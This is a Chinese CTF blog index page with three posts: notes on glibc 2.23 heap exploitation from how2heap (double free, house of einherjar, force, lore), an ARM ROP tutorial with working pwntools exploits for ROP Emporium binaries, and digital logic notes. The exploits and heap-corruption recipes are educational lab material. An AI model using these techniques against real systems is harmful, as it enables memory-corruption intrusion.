<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s Pwnhome">
<meta property="og:url" content="http://hornos3.github.com/page/8/index.html">
<meta property="og:site_name" content="CoLin&#39;s Pwnhome">
<meta property="og:locale">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/8/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh'
  };
</script>

  <title>CoLin's Pwnhome</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's Pwnhome</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">how2heap 深入学习(1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:19+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>刚刚接触pwn的时候就听说过how2heap的大名，奈何那时懒得搭环境无法真实测试。现在环境已经基本完成搭建，于是对how2heap中的内容进行深入学习并记录笔记，温故而知新。本文是基于对how2heap教学项目中源码的分析与理解而完成的学习笔记。</p>
<p>how2heap下载网址: <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p>
<p>测试环境：Ubuntu 16.04<br>Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
<p>按照顺序，本文分析glibc 2_23文件夹中的第1~6个源码。<br><img src="https://img-blog.csdnimg.cn/259410f4b62e4827805f09a9decddb3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQWdDbOKGkQ==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
<h1 id="1-fastbin-dup"><a href="#1-fastbin-dup" class="headerlink" title="1. fastbin_dup"></a>1. fastbin_dup</h1><p>本程序演示fastbin的double_free漏洞。只需要在两次free中间再进行其他free操作，就可以在fastbin链表中存放两个相同的chunk。这个不难理解。</p>
<h1 id="2-fastbin-dup-consolidate"><a href="#2-fastbin-dup-consolidate" class="headerlink" title="2. fastbin_dup_consolidate"></a>2. fastbin_dup_consolidate</h1><p>本程序演示另一种double_free漏洞。在glibc 2.23中，如果fastbin中有chunk存在，那么之后申请一块大于fastbin范围的chunk，会将fastbin中的chunk转移到small bins中。原因如下：</p>
<p><em>首先fastbin中的chunk会通过malloc_consolidate函数转移到unsorted bins中，之后malloc函数在unsorted bins中查找符合大小的chunk。这时就发现了刚刚被转移过来的小chunk。发现大小不够之后，这些chunk又会被转移到small bins中。（malloc在遍历unsorted bin时会将大小不符合的chunk转移到small bins&#x2F;large bins中）</em></p>
<p>此时，fastbin为空，可以将原先在fastbin中的chunk再次free，形成double_free漏洞。</p>
<p><font color=red>注意：在Glibc 2.23中，malloc只会检查fastbin中是否进行了连续的两次free，而不会将fastbin和其他bins中的chunk整合进行检查。</font></p>
<p>此时，在fastbins和small bins中就存在两个相同的chunk。</p>
<h1 id="3-fastbin-dup-into-stack"><a href="#3-fastbin-dup-into-stack" class="headerlink" title="3. fastbin_dup_into_stack"></a>3. fastbin_dup_into_stack</h1><p>本程序演示double_free漏洞的一种应用，即利用fastbin_dup中的double_free漏洞将堆挟持到栈区，在栈区创建chunk。<br>首先进行double_free。此时fastbin中的结构为：</p>
<blockquote>
<p>fastbin → a → b → a</p>
</blockquote>
<p>此时将a分配出来，即可对a的fd指针进行任意写。</p>
<p><font color=red>注意：fastbin是一个链栈结构，遵循后进先出的规则。因此将a分配出来后fastbin的结构为：</font></p>
<blockquote>
<p>fastbin → b → a</p>
</blockquote>
<p>现在，将a中的fd指针更改为栈区某处（这里实际上可以改为任何可写的区域，如bss段等）。将b分配出去，再次分配a后，fastbin中就会有我们自定义的那个地址。</p>
<blockquote>
<p>fastbin → &lt;any address we want&gt; → &lt;other things&gt;</p>
</blockquote>
<p>再分配相同大小的chunk，就可以将chunk分配到任何可写的地方。</p>
<h1 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h1><p>本程序演示house of einherjar漏洞。这是一种null off by one漏洞，即仅溢出一个’\x00’字节即可实现任意地址写。原理如下：</p>
<p><font color=red>首先，需要明确的是，在glibc 2.23 64bit中，如果malloc的大小为0x8 + n*0x10，那么该chunk能够控制下一个chunk的previous size值。因为chunk在64bit中按照0x10对齐（32bit中以0x8对齐），所有chunk的起始地址最低4bit均为0。因此对于分配0x8 + n*0x10的情况，glibc做出的处理是：将后一个chunk的previous size域作为前一个chunk的可用空间。正常情况下，当前一个chunk正在使用时，后一个chunk的previous size不起作用。</font></p>
<p>在上述的前提条件下，可以任意指定previous size的值，并通过溢出一个’\x00’字节对后面一个chunk的size进行部分修改。</p>
<ul>
<li>如果后面一个chunk的size域最低一字节原来为0x01（1表示prev_in_use标志位，即前面一个chunk正在使用中），溢出后变为0x00。假设后一个chunk的地址为x，需要写的地址为y。那么应将后一个chunk的prev_size改为x-y。这样在free后面一个chunk时，malloc_consolidate函数会进行chunk的合并，将chunk头的地址当做y。</li>
</ul>
<p><font color=red>注意：这里不会进行整型溢出的检查，因此x&lt;y也是可行的，此时x-y是一个很大的数。</font></p>
<ul>
<li>如果后面一个chunk的size域最低一字节原来不是0x01而是0x?1，那么溢出一个空字符后，chunk的size会被改变。如果此时不加任何其他处理，在chunk与top chunk合并时会出错。原理：</li>
</ul>
<p><em>_int_free函数中判断后一个chunk是通过size偏移确定的，如果size被改变且没有在后面伪造chunk，在_int_free函数中有一项检查是后一个chunk的prev_in_use是否为1。很显然正常情况下这里都是1，因为没有free之前前一个chunk正在使用，因此如果此时后一个chunk的prev_in_use位为0说明堆结构被篡改。</em></p>
<h2 id="重要：-int-free中的检查项目（部分）"><a href="#重要：-int-free中的检查项目（部分）" class="headerlink" title="重要：_int_free中的检查项目（部分）"></a>重要：_int_free中的检查项目（部分）</h2><ol>
<li>检查相邻chunk是否相等，是则为double free</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>检查该chunk是否为top chunk，top chunk不可被free</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">   &#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>检查该chunk是否超过了arena的范围</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">	  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">	  \&gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">   &#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><strong>检查紧跟该chunk后面（高地址处）的prev_in_use位是否为1</strong></li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">   &#123;</span><br><span class="line">	errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>检查紧跟该chunk后面的size是否合理（不能过小或过大）</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p><font color=blue>笔记：free调用时会调用malloc_consolidate函数整理fastbins。对于fastbins中的chunk先向低地址合并再向高地址合并。这一步操作在最后完成</font></p>
<ul>
<li>因此后面一个chunk的size域最低一字节原来不是0x01而是0x?1时，需要在对应的位置伪造一个chunk，将损失的size大小补齐，来绕过检查。后面的效果与第一种情况相同。</li>
</ul>
<h1 id="5-house-of-force"><a href="#5-house-of-force" class="headerlink" title="5. house_of_force"></a>5. house_of_force</h1><p>本程序演示house_of_force漏洞。这个漏洞的思路比较简单，利用了top chunk。</p>
<p>在glibc 2.23中，malloc不会对top chunk的size进行检查，因此如果能够将top chunk的size修改为很大，就可以malloc任意大小的chunk，从而在任意地址写。</p>
<p><font color=purple>注意：malloc不检查整型溢出。如果需要写的地址在top chunk的低地址处，也可以通过整型溢出到达。</font></p>
<p>假设top chunk头的地址为x，要写的地址为y。那么首先malloc大小为x-y大小的堆块，然后再malloc一下即可对该地址写。注意前面的prev_size和size，必要时需要分配x-y-0x10（32bit为x-y-0x8）大小堆块以实现对目标地址的完全控制。</p>
<h1 id="6-house-of-lore"><a href="#6-house-of-lore" class="headerlink" title="6. house_of_lore"></a>6. house_of_lore</h1><p>本程序演示house_of_lore漏洞，这是一种利用small_bins的攻击方式。</p>
<p>small bins&#x2F;large bins&#x2F;unsorted bins的双向链表结构如下图所示<br><img src="https://img-blog.csdnimg.cn/e11840261fe44692a5a97963baa426aa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQWdDbOKGkQ==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
<p>同unsorted bin类似，small bin也类似于链栈结构，但是双向链表。将small bins中位于链尾的chunk的bk指针修改为想要写的地址，在small bin中的chunk被分配完之后，再次分配就能在该地址创建chunk。</p>
<p>但是在目标地址处还需要进行一些预处理工作。由于glibc的检查机制，导致直接挟持堆不可行。</p>
<p>下面是_int_malloc函数中查找small bins片段的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">         malloc_consolidate (av);</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">         &#123;</span><br><span class="line">           errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">           <span class="keyword">goto</span> errout;</span><br><span class="line">         &#125;</span><br><span class="line">         set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">         bin-&gt;bk = bck;</span><br><span class="line">         bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">           victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">         check_malloced_chunk (av, victim, nb);</span><br><span class="line">         <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">         alloc_perturb (p, bytes);</span><br><span class="line">         <span class="keyword">return</span> p;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>其中有一个明显的检查是<code>__glibc_unlikely (bck-&gt;fd != victim)</code>，它检查要分配的chunk的bk指向的chunk中的fd指针是否是这个chunk。由于我们要分配的是一个假的chunk，因此需要提前设置好这个假chunk的bk指针，以及bk指针指向的另外一处假chunk中fd指针的值，保证二者正确。为了保证结果正确，如果在假chunk之前分配的chunk地址已知，可以将这个地址写入假chunk的fd指针中以使得双向链表完整。当然就上述代码来看这里不设置应该也是可以的。</p>
<p><font color=red>注意：这里的检查并未涉及prev_size和size，因此这二者的值对于假chunk的分配没有影响。原演示文件中将这两个值均设为0。</font></p>
<p>因此总结一下，如果需要写入的地址为x，那么需要将small bins中最后一个chunk的bk指针改为x-0x20（如果写入垃圾数据无妨，可以将这个地址再适当下压一些，如x-0x30，这就需要写入0x10字节的垃圾数据），并且需要在x-0x8处（对应bk）写入另一个地址y，在y+0x10处（对应fd）需要写入x-0x20。故实现该漏洞不仅需要能够在可写地址的低地址方向某处一个8字节区域可写，并且需要另一处8字节区域可写。（需要的两处可写的地方即为下表中标红的地方）</p>
<table>
<thead>
<tr>
<th align="center">addr</th>
<th align="center">+0x0</th>
<th align="center">+0x8</th>
</tr>
</thead>
<tbody><tr>
<td align="center">x-0x20</td>
<td align="center">prev_size</td>
<td align="center">size</td>
</tr>
<tr>
<td align="center">x-0x10</td>
<td align="center">DEADBEEF</td>
<td align="center"><font color=red>addr_y</font></td>
</tr>
<tr>
<td align="center">…</td>
<td align="center">…</td>
<td align="center">…</td>
</tr>
<tr>
<td align="center">y</td>
<td align="center">prev_size</td>
<td align="center">size</td>
</tr>
<tr>
<td align="center">y+0x10</td>
<td align="center"><font color=red>addr_x-0x20</font></td>
<td align="center">DEADBEEF</td>
</tr>
</tbody></table>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-3/" class="post-title-link" itemprop="url">ARM pwn 入门 (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:18" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:18+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><font face=汉仪唐美人>由于网上的ARM pwn题很少很难找，因此这里拿ROP Emporium的8道题做练习，这个<a target="_blank" rel="noopener" href="https://ropemporium.com/">网站</a>有包含x86-64、x86-32、MIPS、ARM共4种架构的elf文件可以做。</font></p>
<h1 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1. ret2win"></a><font face=汉仪唐美人>1. ret2win</font></h1><p><font color=ff0000, face=汉仪唐美人>注意：在执行需要动态链接库加载的ARM elf文件时，如果直接使用<code>qemu-arm xxx</code>有可能会报错：<code>/lib/ld-linux.so.3: No such file or directory</code>。解决方法：安装arm交叉编译包<code>apt install gcc-arm-linux-gnueabi</code>，找到交叉编译包的lib地址（一般都是<code>/usr/arm-linux-gnueabi</code>），在命令后添加<code>-L /usr/arm-linux-gnueabi</code>即可。</font></p>
<p><img src="https://img-blog.csdnimg.cn/72f8330410f2409099e3a2911a620c49.png"><br><font face=汉仪唐美人>这是一道最为简单的栈溢出，ret2text。为了熟悉ARM指令，我们从汇编层面进行分析。</font></p>
<p><font face=汉仪唐美人>可以看到，在ARM的函数调用规则中，参数的赋值顺序是从右到左，如下方<code>BL</code>指令调用<code>read</code>函数前，首先将第3个参数<code>nbytes</code>赋值给<code>R2</code>寄存器。在<code>pwnme</code>函数开头有一个<code>PUSH</code>指令，这里的<code>R11</code>可以看做是<code>rbp</code>，<code>LR</code>是函数返回值，在函数开头这两个寄存器基本都是要入栈的。然后保存<code>R11</code>的值作为栈帧的标记，<code>SP</code>下移留出栈空间。这就是函数开头需要完成的工作，与x86-64架构如出一辙。</font></p>
<p><font face=汉仪唐美人>下面看到<code>read</code>函数的调用部分。第二个参数<code>R1</code>的值为<code>R11-0x24</code>，由于<code>R11</code>在往上就是返回地址，因此要修改返回地址，应该先写入0x24长度的无效字节，然后写后门函数的返回地址。</font></p>
<p><font face=汉仪唐美人>最后看一下函数即将返回之前需要完成的工作。首先恢复<code>SP</code>为<code>R11-4</code>，然后<code>R11</code>出栈，<code>PC</code>出栈。在正常情况下，这里的<code>R11</code>出栈后应该指向父函数的栈空间顶端。现在我们进行了栈溢出，修改了这里的值，<code>R11</code>就无效了。</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">0x24</span>) + p32(<span class="number">0x105ec</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="2-split"><a href="#2-split" class="headerlink" title="2. split"></a><font face=汉仪唐美人>2. split</font></h1><p><img src="https://img-blog.csdnimg.cn/4eb497d770a04a65bc7378c24aaaa801.png"><br><img src="https://img-blog.csdnimg.cn/1c558b27837b49ca94e561b7cb4ff4d5.png"></p>
<p><font face=汉仪唐美人>这里有一个有用的字符串和一个后门函数，只不过这个后门函数不能让我们拿到shell，很自然的想法就是调用system函数，参数改成那个字符串的地址。</font></p>
<p><font face=汉仪唐美人>由于该elf文件的加载地址固定，我们就直接在elf文件中寻找可用的gadget。</font></p>
<p><img src="https://img-blog.csdnimg.cn/30cf8aeff38a4fe995135615b75f0511.png"></p>
<p><font face=汉仪唐美人>不同于x86-64架构，ARM架构下的gadget似乎要更少一些。如上图所示，只用<code>pop</code>指令的gadget中没有能够<code>pop r0</code>的，我们只能扩大范围进行查找：</font></p>
<p><img src="https://img-blog.csdnimg.cn/a33eaa7d29b040aabdef96c34b83c98f.png" alt="在这里插入图片描述"></p>
<p><font face=汉仪唐美人>于是我们找到了这个gadget，它可以和上面的<code>pop &#123;r3, pc&#125;</code>连接起来，首先修改<code>r3</code>的值，再修改<code>r0</code>的值即可。于是我们的exp呼之欲出：</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class="string">&#x27;./split_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">popr3pc = <span class="number">0x103a4</span></span><br><span class="line">movr0r3_popfppc = <span class="number">0x10558</span></span><br><span class="line">shellstr = <span class="number">0x2103c</span></span><br><span class="line">callsystem = <span class="number">0x105e0</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, cyclic(<span class="number">0x24</span>) + p32(popr3pc) + p32(shellstr) + p32(movr0r3_popfppc) + p32(<span class="number">0</span>) + p32(callsystem))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><font face=汉仪唐美人>PS：本来想发三道题的，但是这周末比赛打的太累了，第三题就留到后面一篇文章发了，还请谅解。</font></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-4%E2%80%94%E2%80%94%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-4%E2%80%94%E2%80%94%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF/" class="post-title-link" itemprop="url">数字逻辑 Chapter 4——组合逻辑电路</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:17" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:17+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="4-0-概念"><a href="#4-0-概念" class="headerlink" title="4.0 概念"></a>4.0 概念</h1><ol>
<li>组合逻辑电路：逻辑电路在任何时刻产生的稳定输出信号仅仅取决于该时刻的输入信号，而与输入信号作用前的电路状态无关（即不含触发器），则称为组合逻辑电路</li>
<li>结构特点：电路由逻辑门构成，不含记忆元件；输入单向传输，不含反馈回路</li>
<li>电路类型：根据输出端为1个还是多个分为单输出组合逻辑电路和多输出组合逻辑电路。</li>
</ol>
<h1 id="4-1-组合逻辑电路分析"><a href="#4-1-组合逻辑电路分析" class="headerlink" title="4.1 组合逻辑电路分析"></a>4.1 组合逻辑电路分析</h1><p>对一个给定的逻辑电路，找出其输出与输入之间的逻辑关系。</p>
<p>分析的一般步骤：</p>
<ul>
<li>逻辑电路图（题目中一般给出）</li>
<li>写出逻辑表达式（分析逻辑电路图，具体分析过程无需详细写出）</li>
<li>若电路功能直观简单，则跳过2步，若表达式较为复杂，则需要画出卡诺图化简表达式，否则跳过该步</li>
<li>画出输出端的真值表</li>
<li>分析逻辑功能</li>
<li>改进电路使电路更简单</li>
</ul>
